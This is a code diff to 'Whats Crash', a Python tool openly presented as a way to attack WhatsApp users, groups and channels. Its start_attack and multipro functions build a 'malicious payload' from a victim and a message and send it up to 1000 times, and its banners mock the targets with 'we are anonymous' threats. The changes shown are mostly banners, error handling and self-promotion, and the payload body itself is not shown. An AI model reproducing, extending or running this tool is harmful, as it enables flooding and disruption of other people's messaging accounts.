@@ -1,12 +1,9 @@
-import os, sys, time, json
+
+import os, sys, time, urllib
 from socket import *
 import phonenumbers
-
-try:
-    import requests
-    import urllib
-except:
-    os.system("pip install requests urllib")
+import requests
+import json
 
 ipaddr = gethostbyname(gethostname())
 max_data = (((707+111+1011)*3)-1396)+5 #4096
@@ -32,11 +29,11 @@ def internet():
 
 def aboutus():
     slow("    Tool Name: Whats Crash")
-    slow("    Version: v[1.0]")
+    slow("    Version: v[1.1]")
     slow("    Author: evilfeonix")
-    slow("    Github: EVil FeoniX")
-    slow("    Youtube: EVil FeoniX")
-    slow("    Update: 26 - JAN - 2025")
+    slow("    Github: Digital Firebird")
+    slow("    Youtube: Digital Firebird")
+    slow("    Update: 28 - JAN - 2025")
     slow(f"==========================================================={white}")
 
 
@@ -200,7 +197,37 @@ def set_malicious_payload(user):
     ======================================================================================"""
 
     return data
+def notFound(url):
+    os.system('clear || cls')
+    slow(f"""{red}
+ _      _  _           _           ____               _     
+| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
+| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
+| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
+\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
+===========================================================
+    HAHAHA!. 💀☠💀               
+    we are 🎭 anonymous 🤬,   
+    we do not forgive 👿,  
+    we do not forget 😈,
+    expect us 👥 any time 👀.{red}
+===========================================================
+    Server: {url}
+    Status: Server Not Found        
+    Status_Code: 404        
+    Message: 
+       If you're about to crash Whatsapp User/Group/Channel
+        ==>  The User/Group/Channel is Currently not Active         
+        ==>  Try Whatsapp User that using Whatsapp Business 
 
+    Follow Us on Github
+    Star and Fork our Repositories       
+           [+] Subscribe To Our YouTube Channel [+]
+==========================================================={white}
+            """)
+    input(f"{red}Press [ENTER] to Continue{red}") 
+    evilfeonix="https://github.com/evilfeonix" 
+    os.system(f"xdg-open {evilfeonix}")
 
 def start_attack(msg,victim):
     payload = set_malicious_payload(msg)
@@ -217,13 +244,19 @@ def start_attack(msg,victim):
     
     
     try:response = requests.get(url)
+    
     except requests.exceptions.ConnectionError:
         slow(f"{red}[-] Please Check Your Internet Connection.{white}")
         os.sys.exit()
+    except requests.exceptions.ReadTimeout as a:
+        slow(f"{red}[-] {a}.{white}")
+        os.sys.exit()
+
 
     if response.status_code == 200:
-        os.system("clear || cls")
         return True
+    elif response.status_code == 404:
+        notFound(url)
     else:
         return False
         
@@ -234,11 +267,12 @@ def multipro(victim):
     j=0
     msg = input("[+] Enter message to send: ")
     try:
+        os.system("clear || cls")
+        slow(f"{bg}{red}Press Ctr+C to stop Attacks\033[0m{red}")
         for k in range(1000):
             a = start_attack(msg,victim)
             if a == True:
                 i+=1
-                print(f"{bg}{red}Press Ctr+C to stop Attacks\033[0m{red}",end='\r')
             else:
                 j+=1
 
@@ -251,7 +285,7 @@ def multipro(victim):
  _      _  _           _           ____               _     
 | |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
 | | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
-| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
+| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | | 
 \___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
 ===========================================================
     HAHAHA!. 💀☠💀               
@@ -265,9 +299,16 @@ def multipro(victim):
     Victim: {victim}        
     Sent: {i}        
     Failed: {j}        
-        {bg}{red}Subscribe To Our Youtube Channel\033[0m{red}
+
+    Follow Us on Github
+    Star and Fork our Repositories       
+           [+] Subscribe To Our YouTube Channel [+]
 ==========================================================={white}
             """)
+    input(f"{red}Press [ENTER] to Continue{red}") 
+    evilfeonix="https://github.com/evilfeonix" 
+    os.system(f"xdg-open {evilfeonix}")
+
 def pro(victim):
     i=0
     j=0
@@ -276,6 +317,36 @@ def pro(victim):
     a = start_attack(msg,victim)
     if a == True:
         i+=1
+        slow(f"""{red}
+ _      _  _           _           ____               _     
+| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
+| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
+| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | | 
+\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
+===========================================================
+    HAHAHA!. 💀☠💀               
+    we are 🎭 anonymous 🤬,   
+    we do not forgive 👿,  
+    we do not forget 😈,
+    expect us 👥 any time 👀.{red}
+===========================================================
+    Status: OK        
+    Status_Code: 200        
+    Victim: {victim}        
+    Sent: {i}        
+    Failed: {j}        
+
+    Follow Us on Github
+    Star and Fork our Repositories       
+           [+] Subscribe To Our YouTube Channel [+]
+==========================================================={white}
+            """)
+        input(f"{red}Press [ENTER] to Continue{red}") 
+        evilfeonix="https://github.com/evilfeonix" 
+        os.system(f"xdg-open {evilfeonix}")
+
+    else:
+        j+=1
         slow(f"""{red}
  _      _  _           _           ____               _     
 | |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
@@ -289,17 +360,20 @@ def pro(victim):
     we do not forget 😈,
     expect us 👥 any time 👀.{red}
 ===========================================================
-    Status: OK        
-    Status_Code: 200        
+    Status: Faild to Connect        
+    Status_Code: 0        
     Victim: {victim}        
     Sent: {i}        
     Failed: {j}        
-        {bg}{red}Subscribe To Our Youtube Channel\033[0m{red}
+
+    Follow Us on Github
+    Star and Fork our Repositories       
+           [+] Subscribe To Our YouTube Channel [+]
 ==========================================================={white}
             """)
-    else:
-            j+=1
-    
+        input(f"{red}Press [ENTER] to Continue{red}") 
+        evilfeonix="https://github.com/evilfeonix" 
+        os.system(f"xdg-open {evilfeonix}")
     
 def main():
     banner()
@@ -334,7 +408,7 @@ def main():
     ec = input("    \n[Enter Choice]>> ")
 
     if ec in ['01','1']:
-        slow(f'{red}[-] Thanks for using this tool\nFollow us on github for more...{white}\n')
+        slow('[-] Thanks for using this tool\nFollow us on github for more...')
     elif ec in ['02','2']:
         os.system("clear || cls")
         banner()
@@ -364,7 +438,7 @@ def main():
         url = input('[+] Copy and Paste Group/Channel URL Here : ')
         pro(url)
     else:
-        slow(f'{red}[-] Invalid Choice...{white}\n')
+        slow('[-] Invalid Choice...')
         os.sys.exit()
     
     
